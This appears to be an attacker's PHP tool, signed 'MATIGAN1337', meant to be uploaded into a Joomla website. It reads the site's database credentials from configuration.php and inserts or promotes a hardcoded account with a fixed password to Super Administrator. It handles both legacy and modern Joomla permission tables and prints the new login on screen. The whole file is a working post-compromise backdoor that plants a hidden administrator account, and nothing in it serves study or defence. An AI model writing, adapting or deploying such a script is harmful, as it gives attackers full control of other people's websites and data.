<?php
// CREATE BY MATIGAN1337 - JOOMLA VERSION
// Mendapatkan dokumen root (root directory) dari situs web Anda
$document_root = $_SERVER['DOCUMENT_ROOT'];

// Cari file configuration.php Joomla
$joomla_config_path = $document_root . '/configuration.php';
if (!file_exists($joomla_config_path)) {
    $joomla_config_path = __DIR__ . '/configuration.php';
}
if (!file_exists($joomla_config_path)) {
    $joomla_config_path = dirname(__DIR__) . '/configuration.php';
}

// Variabel untuk data pengguna
$user = 'officialgershenzon'; // Ganti dengan nama pengguna yang Anda inginkan
$user_password = '4nj3n93n4kb4n93t@!1337%$'; // Ganti dengan kata sandi yang Anda inginkan
$email = 'offcial@gershenzon.com.ua'; // Ganti dengan alamat email yang Anda inginkan
$name = 'Official Gershenzon';

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Joomla Admin Creator</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0f172a;
            color: #e2e8f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background-color: #1e293b;
            border-radius: 12px;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3), 0 8px 10px -6px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 500px;
            padding: 30px;
            border: 1px solid #334155;
        }
        h2 {
            margin-top: 0;
            color: #38bdf8;
            text-align: center;
            border-bottom: 2px solid #334155;
            padding-bottom: 15px;
        }
        .status-box {
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-weight: 500;
        }
        .success {
            background-color: rgba(16, 185, 129, 0.15);
            border: 1px solid #10b981;
            color: #34d399;
        }
        .error {
            background-color: rgba(239, 68, 68, 0.15);
            border: 1px solid #ef4444;
            color: #f87171;
        }
        .info-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }
        .info-table td {
            padding: 10px;
            border-bottom: 1px solid #334155;
        }
        .info-table td.label {
            color: #94a3b8;
            font-weight: 600;
            width: 35%;
        }
        .info-table td.value {
            font-family: monospace;
            color: #f1f5f9;
        }
        .footer {
            margin-top: 25px;
            text-align: center;
            font-size: 0.85rem;
            color: #64748b;
        }
    </style>
</head>
<body>
<div class="container">
    <h2>Joomla Super Admin Creator</h2>
<?php

// Periksa apakah file configuration.php ada
if (file_exists($joomla_config_path)) {
    // Dapatkan data koneksi database
    if (!class_exists('JConfig')) {
        @require_once($joomla_config_path);
    }

    if (class_exists('JConfig')) {
        $config = new JConfig();
        $localhost = $config->host;
        $database = $config->db;
        $username = $config->user;
        $password = $config->password;
        $prefix = $config->dbprefix;
    } else {
        // Fallback parser jika kelas gagal dimuat secara dinamis
        $config_content = @file_get_contents($joomla_config_path);
        
        preg_match("/public\s+\\\$host\s*=\s*['\"](.*?)['\"]/i", $config_content, $m_host);
        preg_match("/public\s+\\\$user\s*=\s*['\"](.*?)['\"]/i", $config_content, $m_user);
        preg_match("/public\s+\\\$password\s*=\s*['\"](.*?)['\"]/i", $config_content, $m_pass);
        preg_match("/public\s+\\\$db\s*=\s*['\"](.*?)['\"]/i", $config_content, $m_db);
        preg_match("/public\s+\\\$dbprefix\s*=\s*['\"](.*?)['\"]/i", $config_content, $m_prefix);
        
        $localhost = isset($m_host[1]) ? $m_host[1] : 'localhost';
        $database = isset($m_db[1]) ? $m_db[1] : '';
        $username = isset($m_user[1]) ? $m_user[1] : '';
        $password = isset($m_pass[1]) ? $m_pass[1] : '';
        $prefix = isset($m_prefix[1]) ? $m_prefix[1] : 'jos_';
    }

    // Buat koneksi ke database MySQL
    $conn = @mysqli_connect($localhost, $username, $password, $database);

    if (!$conn) {
        echo '<div class="status-box error">Koneksi database gagal: ' . mysqli_connect_error() . '</div>';
    } else {
        // Auto-detect Joomla version berdasarkan tabel yang ada
        $is_joomla15 = false;
        $checkTable = mysqli_query($conn, "SHOW TABLES LIKE '{$prefix}user_usergroup_map'");
        if (!$checkTable || mysqli_num_rows($checkTable) == 0) {
            // Tabel modern tidak ada, cek tabel Joomla 1.5
            $checkLegacy = mysqli_query($conn, "SHOW TABLES LIKE '{$prefix}core_acl_aro'");
            if ($checkLegacy && mysqli_num_rows($checkLegacy) > 0) {
                $is_joomla15 = true;
            }
        }

        $joomla_version_label = $is_joomla15 ? 'Joomla 1.5 (Legacy ACL)' : 'Joomla 2.5+ (Modern ACL)';

        // Periksa apakah pengguna dengan username atau email yang sama sudah ada
        $checkUserQuery = "SELECT id FROM `{$prefix}users` WHERE username = '" . mysqli_real_escape_string($conn, $user) . "' OR email = '" . mysqli_real_escape_string($conn, $email) . "'";
        $checkResult = mysqli_query($conn, $checkUserQuery);

        if ($checkResult && mysqli_num_rows($checkResult) > 0) {
            $existingUser = mysqli_fetch_assoc($checkResult);
            $existingId = $existingUser['id'];

            // Jika user sudah ada, pastikan ia berada di grup Super Users
            $mapOk = false;
            if ($is_joomla15) {
                // Joomla 1.5: cek di core_acl_aro + core_acl_groups_aro_map
                $checkAro = mysqli_query($conn, "SELECT aro_id FROM `{$prefix}core_acl_aro` WHERE value = '$existingId' AND section_value = 'users'");
                if ($checkAro && mysqli_num_rows($checkAro) > 0) {
                    $aroRow = mysqli_fetch_assoc($checkAro);
                    $aroId = $aroRow['aro_id'];
                    // group_id 25 = Super Administrator di Joomla 1.5
                    $checkMap = mysqli_query($conn, "SELECT * FROM `{$prefix}core_acl_groups_aro_map` WHERE aro_id = $aroId AND group_id = 25");
                    if ($checkMap && mysqli_num_rows($checkMap) > 0) {
                        $mapOk = true;
                        echo '<div class="status-box success">Pengguna "' . htmlspecialchars($user) . '" sudah ada dan sudah memiliki hak akses Super Administrator.</div>';
                    } else {
                        // Tambahkan ke grup Super Administrator
                        $sqlMap = "INSERT INTO `{$prefix}core_acl_groups_aro_map` (`group_id`, `section_value`, `aro_id`) VALUES (25, '', $aroId)";
                        if (mysqli_query($conn, $sqlMap)) {
                            $mapOk = true;
                            echo '<div class="status-box success">Pengguna "' . htmlspecialchars($user) . '" sudah ada, dan berhasil ditambahkan ke grup Super Administrator!</div>';
                        } else {
                            echo '<div class="status-box error">Error saat memetakan ke grup Super Administrator: ' . mysqli_error($conn) . '</div>';
                        }
                    }
                } else {
                    // ARO belum ada, buat ARO dulu
                    $sqlAro = "INSERT INTO `{$prefix}core_acl_aro` (`section_value`, `value`, `name`) VALUES ('users', '$existingId', '" . mysqli_real_escape_string($conn, $user) . "')";
                    if (mysqli_query($conn, $sqlAro)) {
                        $newAroId = mysqli_insert_id($conn);
                        $sqlMap = "INSERT INTO `{$prefix}core_acl_groups_aro_map` (`group_id`, `section_value`, `aro_id`) VALUES (25, '', $newAroId)";
                        if (mysqli_query($conn, $sqlMap)) {
                            $mapOk = true;
                            echo '<div class="status-box success">Pengguna "' . htmlspecialchars($user) . '" sudah ada, dan berhasil ditambahkan ke grup Super Administrator!</div>';
                        } else {
                            echo '<div class="status-box error">Error saat memetakan ARO ke grup: ' . mysqli_error($conn) . '</div>';
                        }
                    } else {
                        echo '<div class="status-box error">Error saat membuat ARO: ' . mysqli_error($conn) . '</div>';
                    }
                }
                // Update gid dan usertype di tabel users
                mysqli_query($conn, "UPDATE `{$prefix}users` SET gid = 25, usertype = 'Super Administrator' WHERE id = $existingId");
            } else {
                // Joomla 2.5+: cek di user_usergroup_map
                $checkMapQuery = "SELECT * FROM `{$prefix}user_usergroup_map` WHERE user_id = $existingId AND group_id = 8";
                $mapResult = mysqli_query($conn, $checkMapQuery);

                if ($mapResult && mysqli_num_rows($mapResult) > 0) {
                    $mapOk = true;
                    echo '<div class="status-box success">Pengguna "' . htmlspecialchars($user) . '" sudah ada dan sudah memiliki hak akses Super User.</div>';
                } else {
                    $sqlInsertMap = "INSERT INTO `{$prefix}user_usergroup_map` (`user_id`, `group_id`) VALUES ($existingId, 8)";
                    if (mysqli_query($conn, $sqlInsertMap)) {
                        $mapOk = true;
                        echo '<div class="status-box success">Pengguna "' . htmlspecialchars($user) . '" sudah ada, dan berhasil ditambahkan ke grup Super User!</div>';
                    } else {
                        echo '<div class="status-box error">Error saat memetakan pengguna ke grup Super User: ' . mysqli_error($conn) . '</div>';
                    }
                }
            }
            
            echo '<table class="info-table">
                    <tr><td class="label">Username</td><td class="value">' . htmlspecialchars($user) . '</td></tr>
                    <tr><td class="label">Email</td><td class="value">' . htmlspecialchars($email) . '</td></tr>
                    <tr><td class="label">Joomla</td><td class="value">' . $joomla_version_label . '</td></tr>
                    <tr><td class="label">Status</td><td class="value" style="color: #34d399;">Sudah Aktif / Diperbarui</td></tr>
                  </table>';
        } else {
            // Hash password - kompatibel dengan semua versi PHP
            if (function_exists('password_hash')) {
                // PHP 5.5+ : gunakan bcrypt
                $hashed_password = password_hash($user_password, PASSWORD_DEFAULT);
            } else {
                // PHP < 5.5 : gunakan format Joomla (md5:salt)
                $salt = substr(md5(uniqid(rand(), true)), 0, 32);
                $hashed_password = md5($user_password . $salt) . ':' . $salt;
            }
            
            // Query insert user baru
            if ($is_joomla15) {
                // Joomla 1.5: kolom berbeda (gid, usertype)
                $sqlInsertUser = "INSERT INTO `{$prefix}users` (`name`, `username`, `email`, `password`, `usertype`, `gid`, `block`, `sendEmail`, `registerDate`, `lastvisitDate`, `params`) 
                                  VALUES ('" . mysqli_real_escape_string($conn, $name) . "', '" . mysqli_real_escape_string($conn, $user) . "', '" . mysqli_real_escape_string($conn, $email) . "', '" . mysqli_real_escape_string($conn, $hashed_password) . "', 'Super Administrator', 25, 0, 0, NOW(), NOW(), '')";
            } else {
                // Joomla 2.5+
                $sqlInsertUser = "INSERT INTO `{$prefix}users` (`name`, `username`, `email`, `password`, `block`, `sendEmail`, `registerDate`, `lastvisitDate`, `params`) 
                                  VALUES ('" . mysqli_real_escape_string($conn, $name) . "', '" . mysqli_real_escape_string($conn, $user) . "', '" . mysqli_real_escape_string($conn, $email) . "', '" . mysqli_real_escape_string($conn, $hashed_password) . "', 0, 0, NOW(), NOW(), '')";
            }

            if (mysqli_query($conn, $sqlInsertUser)) {
                $userId = mysqli_insert_id($conn);
                $groupMapped = false;

                if ($is_joomla15) {
                    // Joomla 1.5: buat ARO entry dan map ke grup Super Administrator (25)
                    $sqlAro = "INSERT INTO `{$prefix}core_acl_aro` (`section_value`, `value`, `name`) VALUES ('users', '$userId', '" . mysqli_real_escape_string($conn, $user) . "')";
                    if (mysqli_query($conn, $sqlAro)) {
                        $aroId = mysqli_insert_id($conn);
                        $sqlMap = "INSERT INTO `{$prefix}core_acl_groups_aro_map` (`group_id`, `section_value`, `aro_id`) VALUES (25, '', $aroId)";
                        if (mysqli_query($conn, $sqlMap)) {
                            $groupMapped = true;
                        }
                    }
                } else {
                    // Joomla 2.5+: map ke user_usergroup_map
                    $sqlInsertMap = "INSERT INTO `{$prefix}user_usergroup_map` (`user_id`, `group_id`) VALUES ($userId, 8)";
                    if (mysqli_query($conn, $sqlInsertMap)) {
                        $groupMapped = true;
                    }
                }

                if ($groupMapped) {
                    $groupLabel = $is_joomla15 ? '25 (Super Administrator)' : '8 (Super User)';
                    echo '<div class="status-box success">Berhasil! Super Admin Joomla telah dibuat.</div>';
                    echo '<table class="info-table">
                            <tr><td class="label">Username</td><td class="value">' . htmlspecialchars($user) . '</td></tr>
                            <tr><td class="label">Password</td><td class="value">' . htmlspecialchars($user_password) . '</td></tr>
                            <tr><td class="label">Email</td><td class="value">' . htmlspecialchars($email) . '</td></tr>
                            <tr><td class="label">User ID</td><td class="value">' . $userId . '</td></tr>
                            <tr><td class="label">Group ID</td><td class="value">' . $groupLabel . '</td></tr>
                            <tr><td class="label">Joomla</td><td class="value">' . $joomla_version_label . '</td></tr>
                          </table>';
                } else {
                    echo '<div class="status-box error">Pengguna berhasil dibuat, tetapi gagal ditambahkan ke grup Super User: ' . mysqli_error($conn) . '</div>';
                }
            } else {
                echo '<div class="status-box error">Error saat membuat pengguna baru: ' . mysqli_error($conn) . '</div>';
            }
        }

        mysqli_close($conn);
    }
} else {
    echo '<div class="status-box error">File <strong>configuration.php</strong> tidak ditemukan. Pastikan script diletakkan di dalam folder Joomla.</div>';
}
?>
    <div class="footer">
        &copy; 2026 Joomla Admin Creator. Created by MATIGAN1337.
    </div>
</div>
</body>
</html>
